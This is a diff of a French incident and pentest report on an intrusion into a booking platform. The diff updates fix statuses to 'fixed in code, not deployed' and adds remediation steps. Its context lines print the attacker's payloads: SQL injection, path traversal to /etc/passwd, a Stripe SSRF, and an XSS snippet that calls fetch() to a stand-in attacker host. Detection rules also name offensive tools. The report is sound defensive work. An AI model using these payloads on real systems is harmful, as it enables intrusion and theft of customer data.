@@ -89,21 +89,24 @@ Les huit vulnérabilités ont été localisées dans le code et sept ont été r
 
 | ID | Vulnérabilité | Exploitation | Impact | Risque | Reproduite | Exploitée le 7/11 | Correctif |
 |---|---|---|---|---|---|---|---|
-| D1 | Injection SQL sur `/api/rooms/` | Facile | Critique | **Critique** | Oui | **Oui** (11:11, 11:16) | À appliquer |
-| D2 | Path traversal sur `/api/uploads/` | Facile | Critique | **Critique** | Oui | **Oui** (11:18–11:19) | À appliquer |
-| D3 | SSRF vers l'API Stripe | Modérée | Critique | **Critique** | Oui | **Oui** (11:19–11:23) | À appliquer |
-| D4 | Secret de confirmation prévisible | Modérée | Critique | **Critique** | Oui | **Oui** (11:16, secret lu via D1) | À appliquer |
-| D5 | E-mail des hôtes exposé par l'API | Facile | Important | **Majeur** | Oui | Exposé (non ciblé) | À appliquer |
-| D6 | Clés Stripe dans le dépôt Git | Difficile* | Critique | **Majeur*** | Oui (audit Git) | Non observée | À appliquer |
-| D7 | En-têtes de sécurité absents → XSS | Difficile | Majeur | **Majeur** | Oui (sans payload) | Non observée | À appliquer |
-| D8 | Bannières serveur et mode debug | Très difficile | Important | **Mineur** | Oui | **Oui** (11:18, tracebacks) | À appliquer |
+| D1 | Injection SQL sur `/api/rooms/` | Facile | Critique | **Critique** | Oui | **Oui** (11:11, 11:16) | Corrigé, **non déployé** |
+| D2 | Path traversal sur `/api/uploads/` | Facile | Critique | **Critique** | Oui | **Oui** (11:18–11:19) | Corrigé, **non déployé** |
+| D3 | SSRF vers l'API Stripe | Modérée | Critique | **Critique** | Oui | **Oui** (11:19–11:23) | Corrigé, **non déployé** |
+| D4 | Secret de confirmation prévisible | Modérée | Critique | **Critique** | Oui | **Oui** (11:16, secret lu via D1) | Corrigé, **non déployé** |
+| D5 | E-mail des hôtes exposé par l'API | Facile | Important | **Majeur** | Oui | Exposé (non ciblé) | Corrigé, **non déployé** |
+| D6 | Clés Stripe dans le dépôt Git | Difficile* | Critique | **Majeur*** | Oui (audit Git) | Non observée | Partiel †, **non déployé** |
+| D7 | En-têtes de sécurité absents → XSS | Difficile | Majeur | **Majeur** | Oui (sans payload) | Non observée | Corrigé, **non déployé** |
+| D8 | Bannières serveur et mode debug | Très difficile | Important | **Mineur** | Oui | **Oui** (11:18, tracebacks) | Corrigé, **non déployé** |
 
 \* Évaluation de l'annexe 5. La clé `sk_test_…` étant encore dans le code actuel, nous réévaluons l'exploitation en **Facile**, soit un risque **Critique** (voir D6).
+† Clé retirée du code (commit `fa3ec78`, 13/11/2026), mais ni révoquée côté Stripe ni purgée de l'historique Git — voir D6.
+
+**« Non déployé »** : le correctif existe dans le dépôt GitHub mais n'a pas encore été mis en ligne. **Tant qu'il n'est pas déployé, les huit vulnérabilités restent exploitables sur l'environnement actuellement actif** (pré-production, et donc production le jour où elle sera remise en ligne dans le même état). Corriger le code ne protège personne avant sa mise en production.
 
 **Répartition** (évaluation de l'annexe 5, toutes confirmées) : **4 Critiques**, **3 Majeures**, 0 Importante, **1 Mineure**.
 
 **Constats principaux** :
-- Aucune des huit vulnérabilités remontées en juin 2026 n'a été corrigée. Les quatre critiques ont toutes servi à l'attaque.
+- Les huit vulnérabilités remontées en juin 2026 sont restées non corrigées jusqu'à l'attaque du 7 novembre ; les quatre critiques ont toutes servi à l'intrusion. Le code a depuis été corrigé pour D1 à D5, D7 et D8 (commit `fa3ec78`, 13/11/2026) ; D6 reste partiel (voir note ci-dessus). **Aucun de ces correctifs n'est pour l'instant déployé : la plateforme reste vulnérable en l'état tant que ce code n'est pas mis en ligne.**
 - L'attaquant a enchaîné les failles : D1 lui a fourni le secret exploité par D4, D4 a rendu sa réservation « payée » (prérequis de D3), et D3 a servi à l'exfiltration. Corriger D3 seule aurait suffi à empêcher l'exfiltration des données de paiement. Corriger D1 seule l'aurait au moins retardée : il aurait alors fallu bruteforcer le secret (D4).
 - Aucun mécanisme de détection n'a réagi à 6 783 requêtes venues d'une même IP en 42 minutes, ni aux User-Agents d'outils offensifs (`dirsearch`, `python-requests`).
 
@@ -246,7 +249,7 @@ Les colonnes sélectionnées sont mappées positionnellement sur le modèle `Roo
 
 **Observation complémentaire (hors périmètre D1-D8, à ajouter aux recommandations finales)** : les hash extraits font 32 caractères hexadécimaux → format **MD5**, algorithme de hachage obsolète et non salé (`5f4dcc3b5aa765d61d8327deb882cf99` = MD5 connu de `"password"`). Recommandation : migrer vers bcrypt/argon2 avec sel.
 
-**Correctif et re-test** : *statut : à appliquer (code non corrigé au 13/11/2026).* Après correction, rejouer la requête de l'attaque : `GET /api/rooms/?category=x'%20OR%20'1'='1'--%20-` doit renvoyer `200 []`. La requête `UNION SELECT` de l'attaquant ne doit plus renvoyer de données de `bookings`.
+**Correctif et re-test** : *statut : **corrigé** dans le code (`rooms_api.py` utilise désormais `Room.query.filter_by(category=category)`, commit `fa3ec78`, 13/11/2026) — **non déployé : la faille reste exploitable sur l'environnement actuellement en ligne tant que ce commit n'y est pas mis en production.** Re-test à faire après déploiement.* Rejouer la requête de l'attaque : `GET /api/rooms/?category=x'%20OR%20'1'='1'--%20-` doit renvoyer `200 []`. La requête `UNION SELECT` de l'attaquant ne doit plus renvoyer de données de `bookings`.
 
 ---
 
@@ -296,7 +299,7 @@ Payload : `../../../../../etc/passwd`
 
 **Recommandation** : valider/assainir le paramètre `name` (whitelist de caractères, `os.path.basename()`), et vérifier via `os.path.realpath()` que le chemin résolu reste bien dans le répertoire `uploads/`.
 
-**Correctif et re-test** : *statut : à appliquer (code non corrigé au 13/11/2026).* Après correction, rejouer la requête de l'attaque : `GET /api/uploads/?name=../app.py` et `?name=../../etc/passwd` doivent renvoyer `404` (ou `400`), sans contenu.
+**Correctif et re-test** : *statut : **corrigé** dans le code (`uploads_api.py` valide désormais le nom via `os.path.basename()` + `os.path.realpath()` avec vérification du préfixe, commit `fa3ec78`, 13/11/2026) — **non déployé : la faille reste exploitable sur l'environnement actuellement en ligne tant que ce commit n'y est pas mis en production.** Re-test à faire après déploiement.* Rejouer la requête de l'attaque : `GET /api/uploads/?name=../app.py` et `?name=../../etc/passwd` doivent renvoyer `404` (ou `400`), sans contenu.
 
 ---
 
@@ -349,7 +352,7 @@ https://hackbnb.dashbox.cloud/booking/VM4UXB28?checkout_confirmation_secret=2cac
 
 **Recommandation** : valider `checkout_session_id` contre un format strict (regex `^cs_[a-zA-Z0-9_]+$`), et/ou vérifier que la session Stripe récupérée correspond bien au `stripe_checkout_session_id` déjà enregistré pour la réservation concernée.
 
-**Correctif et re-test** : *statut : à appliquer (code non corrigé au 13/11/2026).* Après correction, rejouer la requête de l'attaque : `GET /api/bookings/<réf. payée>/checkout-lines?checkout_session_id=../../customers%23` doit renvoyer `400`, et un `checkout_session_id` différent de celui enregistré pour la réservation doit être refusé.
+**Correctif et re-test** : *statut : **corrigé** dans le code (`checkout_session_id` est désormais lu depuis `booking.stripe_checkout_session_id` côté serveur, plus depuis le paramètre client, et validé par une regex `^cs_[A-Za-z0-9_]+$`, commit `fa3ec78`, 13/11/2026) — **non déployé : la faille reste exploitable sur l'environnement actuellement en ligne tant que ce commit n'y est pas mis en production.** Re-test à faire après déploiement.* Rejouer la requête de l'attaque : `GET /api/bookings/<réf. payée>/checkout-lines?checkout_session_id=../../customers%23` doit renvoyer `400`, et un `checkout_session_id` différent de celui enregistré pour la réservation doit être refusé.
 
 ---
 
@@ -406,7 +409,7 @@ GET /api/bookings/XFX6Q5I2 HTTP/2
 - combiné à D3 (SSRF), ce secret peut aussi être lu directement dans le `success_url` d'une session Stripe d'un autre client (cf. l'observation sur le chaînage D3 → D4), rendant le bruteforce ci-dessus même superflu pour un attaquant qui aurait déjà exploité D3.
 - le secret est transmis **dans l'URL** de redirection (`success_url=...&checkout_confirmation_secret=...`, `back/services/stripe.py`), donc par construction journalisé par tout reverse-proxy/serveur web en amont (le format de log `combined` d'Apache inclut la ligne de requête complète), ce qui correspond à CWE-598 (Use of GET Request Method With Sensitive Query Strings). Quiconque a accès aux journaux d'accès peut rejouer ce secret sans même avoir à le bruteforcer.
 
-**Correctif et re-test** : *statut : à appliquer (code non corrigé au 13/11/2026).* Après correction, rejouer la requête de l'attaque : Le bruteforce Intruder (SHA-512 des timestamps autour de la création) doit renvoyer uniquement des `422`. Le secret généré doit faire 64 caractères hexadécimaux aléatoires, sans lien avec l'heure.
+**Correctif et re-test** : *statut : **corrigé** dans le code (`checkout_confirmation_secret = secrets.token_hex(32)` remplace le hash du timestamp, commit `fa3ec78`, 13/11/2026) — **non déployé : la faille reste exploitable sur l'environnement actuellement en ligne tant que ce commit n'y est pas mis en production.** Re-test à faire après déploiement.* Rejouer la requête de l'attaque : le bruteforce Intruder (SHA-512 des timestamps autour de la création) doit renvoyer uniquement des `422`. Le secret généré doit faire 64 caractères hexadécimaux aléatoires, sans lien avec l'heure.
 
 ---
 
@@ -476,7 +479,7 @@ if self.host_user:
 ```
 L'e-mail ne doit être renvoyé que par une route authentifiée (`/users/me`), à l'utilisateur concerné.
 
-**Correctif et re-test** : *statut : à appliquer (code non corrigé au 13/11/2026).* Après correction, rejouer la requête de l'attaque : `GET /api/rooms/1` et `GET /api/rooms/` ne doivent plus contenir de champ `host.email`.
+**Correctif et re-test** : *statut : **corrigé** dans le code (`rooms_models.py` utilise désormais `self.host_user.to_public_dict()`, commit `fa3ec78`, 13/11/2026) — **non déployé : la faille reste exploitable sur l'environnement actuellement en ligne tant que ce commit n'y est pas mis en production.** Re-test à faire après déploiement.* Rejouer la requête de l'attaque : `GET /api/rooms/1` et `GET /api/rooms/` ne doivent plus contenir de champ `host.email`.
 
 ---
 
@@ -551,7 +554,7 @@ Le commit `9eeb41e` ("fix: do not hardcode the Stripe API key") retire la clé d
 3. Nettoyer l'historique Git après rotation des clés (`git filter-repo`, BFG Repo-Cleaner).
 4. Intégrer un scanner de secrets (Gitleaks, TruffleHog) en pre-commit et en CI pour bloquer toute nouvelle fuite avant fusion.
 
-**Correctif et re-test** : *statut : à appliquer (code non corrigé au 13/11/2026).* Après correction, rejouer la requête de l'attaque : `gitleaks git .` doit renvoyer 0 secret Stripe, et les anciennes clés doivent apparaître comme révoquées dans le dashboard Stripe.
+**Correctif et re-test** : *statut : **corrigé partiellement, et non déployé**. La clé n'est plus codée en dur (`docker-compose.yml` lit désormais `STRIPE_API_KEY` depuis l'environnement, commit `fa3ec78`, 13/11/2026), mais ce commit n'est pas encore en ligne : la clé reste lisible en clair sur l'environnement actuellement déployé. La révocation des deux clés dans le dashboard Stripe et le nettoyage de l'historique Git restent en plus à faire, quel que soit le déploiement : les commits `4aec6cd79…` et `ef5503c` contiennent toujours les clés en clair.* Rejouer la requête de l'attaque : `gitleaks git .` doit renvoyer 0 secret Stripe une fois l'historique nettoyé, et les anciennes clés doivent apparaître comme révoquées dans le dashboard Stripe.
 
 ---
 
@@ -640,7 +643,7 @@ UPDATE rooms SET description = '<img src=x onerror=fetch("https://attaquant.tld/
 
 **Observation complémentaire** : l'API renvoie `access-control-allow-origin: http://localhost:9000`. `APP_ORIGIN_HOST` est resté sur sa valeur de développement en pré-production : la configuration CORS n'a pas été adaptée à l'environnement.
 
-**Correctif et re-test** : *statut : à appliquer (code non corrigé au 13/11/2026).* Après correction, rejouer la requête de l'attaque : `curl -sI https://hackbnb.dashbox.cloud/` doit afficher `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy` et `Strict-Transport-Security`. Une description `<img src=x onerror=alert(1)>` doit s'afficher en texte, sans exécution.
+**Correctif et re-test** : *statut : **corrigé** dans le code (en-têtes `Content-Security-Policy` et consorts ajoutés dans `apache-prod.conf`, `dangerouslySetInnerHTML` retiré de `Room.tsx` et `Booking.tsx`, commit `fa3ec78`, 13/11/2026) — **non déployé : la faille reste exploitable sur l'environnement actuellement en ligne tant que ce commit n'y est pas mis en production.** Re-test à faire après déploiement.* Rejouer la requête de l'attaque : `curl -sI https://hackbnb.dashbox.cloud/` doit afficher `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy` et `Strict-Transport-Security`. Une description `<img src=x onerror=alert(1)>` doit s'afficher en texte, sans exécution.
 
 ---
 
@@ -738,7 +741,7 @@ Les réponses divulguent :
    Header always unset X-Powered-By
    ```
 
-**Correctif et re-test** : *statut : à appliquer (code non corrigé au 13/11/2026).* Après correction, rejouer la requête de l'attaque : `curl -sI …/api/` ne doit plus afficher `Werkzeug` ni `Python`. `GET /api/uploads/?name=test.jpg` ne doit plus renvoyer de traceback.
+**Correctif et re-test** : *statut : **corrigé** dans le code (`debug=True` retiré de `app.py`, `ServerTokens Prod` / `ServerSignature Off` ajoutés dans `apache-prod.conf`, commit `fa3ec78`, 13/11/2026) — **non déployé : la faille reste exploitable sur l'environnement actuellement en ligne tant que ce commit n'y est pas mis en production.** Re-test à faire après déploiement.* Rejouer la requête de l'attaque : `curl -sI …/api/` ne doit plus afficher `Werkzeug` ni `Python`. `GET /api/uploads/?name=test.jpg` ne doit plus renvoyer de traceback.
 
 ---
 
@@ -751,26 +754,27 @@ Les correctifs propres à chaque faille sont détaillés en section 6. Cette sec
 1. **Révoquer et régénérer les clés Stripe** `sk_test_…` et `rk_test_…` (D6), puis contrôler dans le dashboard Stripe l'absence d'opération non légitime depuis le 7 novembre.
 2. **Notifier la CNIL** (RGPD, art. 33). Le délai de 72 h court depuis la prise de connaissance de l'incident, le 9 novembre au matin. Si ce délai est dépassé, la notification doit en expliquer les raisons.
 3. **Informer les 624 clients concernés** (RGPD, art. 34) : données de paiement exposées et mises en vente, risque d'hameçonnage ciblé. Prévenir également Stripe.
-4. **Corriger D1, D2, D3 et D4** (risque critique), puis rejouer les requêtes de l'attaquant pour vérifier qu'elles échouent (section 6, « Correctif et re-test »).
-5. **Désactiver le mode debug** et passer sur un serveur WSGI de production (D8).
+4. Corriger D1, D2, D3 et D4 : **fait dans le code** (commit `fa3ec78`, 13/11/2026), **mais pas déployé** — les failles restent exploitables sur l'environnement en ligne. Déployer, puis rejouer les requêtes de l'attaquant sur la pré-production pour vérifier qu'elles échouent (section 6, « Correctif et re-test »).
+5. Désactiver le mode debug : **fait dans le code, pas déployé**. `debug=True` retiré, mais le serveur tourne toujours avec `app.run()` plutôt qu'un serveur WSGI de production (Gunicorn) — à finaliser (D8).
 
 ### Court terme (sous un mois)
 
-6. Corriger D5 et D7 et positionner les en-têtes de sécurité.
-7. Purger l'historique Git des secrets (`git filter-repo`) et ajouter Gitleaks en hook `pre-commit` et en CI (D6).
+6. Corriger D5 et D7 : **fait dans le code, pas déployé**. Représentation publique sans e-mail, en-têtes de sécurité positionnés (commit `fa3ec78`, 13/11/2026).
+7. Purger l'historique Git des secrets (`git filter-repo`) et ajouter Gitleaks en hook `pre-commit` et en CI (D6) — toujours à faire, les clés sont toujours lisibles dans les commits `4aec6cd79…` et `ef5503c`.
 8. Migrer le hachage des mots de passe de MD5 non salé vers Argon2id ou bcrypt. Forcer la réinitialisation des mots de passe, la table `users` ayant pu être lue (D1).
 9. Ne plus transmettre `checkout_confirmation_secret` dans l'URL de retour Stripe (CWE-598). Purger les journaux qui le contiennent.
+10. **Épingler la version d'Apache** : `prod.dockerfile` installe `apache2` via `apt install -y apache2` sans version fixée, donc sans garantie sur la version réellement déployée ni sur le suivi des correctifs de sécurité (distinct de D8, qui ne fait que masquer la bannière de version). Fixer une version (ex. `apache2=2.4.68*`), suivre les avis de sécurité Debian/Apache, et planifier des mises à jour régulières plutôt que de dépendre de l'état des dépôts au moment du build.
 
 ### Moyen terme (détection et prévention)
 
-10. **Détection** : centraliser les journaux (la pile Grafana / Loki utilisée ici convient) et créer des alertes simples, qui auraient suffi le 7 novembre :
+11. **Détection** : centraliser les journaux (la pile Grafana / Loki utilisée ici convient) et créer des alertes simples, qui auraient suffi le 7 novembre :
     - plus de 100 requêtes par minute depuis une même IP ;
     - User-Agent d'outil offensif (`dirsearch`, `sqlmap`, `python-requests`…) ;
     - pic de réponses 404 ou 500 ;
     - réponse de plus de 1 Mo sur une route API.
-11. **Protection** : un WAF devant Apache (ModSecurity et OWASP Core Rule Set) et une limitation de débit par IP sur `/api/`.
-12. **Signalement de vulnérabilités** : publier un fichier `/.well-known/security.txt` et une adresse `security@` surveillée, hors filtre anti-spam. L'e-mail de l'attaquant est resté deux jours dans les spams.
-13. **Cycle de sécurité** : corriger les vulnérabilités d'un rapport de pentest dans des délais fixés par niveau de risque (critique : immédiat ; majeur : court terme). Refaire un test d'intrusion après correction, puis au moins une fois par an. Former les deux développeurs aux bases du développement sécurisé (OWASP Top 10).
+12. **Protection** : un WAF devant Apache (ModSecurity et OWASP Core Rule Set) et une limitation de débit par IP sur `/api/`.
+13. **Signalement de vulnérabilités** : publier un fichier `/.well-known/security.txt` et une adresse `security@` surveillée, hors filtre anti-spam. L'e-mail de l'attaquant est resté deux jours dans les spams.
+14. **Cycle de sécurité** : corriger les vulnérabilités d'un rapport de pentest dans des délais fixés par niveau de risque (critique : immédiat ; majeur : court terme). Refaire un test d'intrusion après correction, puis au moins une fois par an. Former les deux développeurs aux bases du développement sécurisé (OWASP Top 10).
 
 ---
 
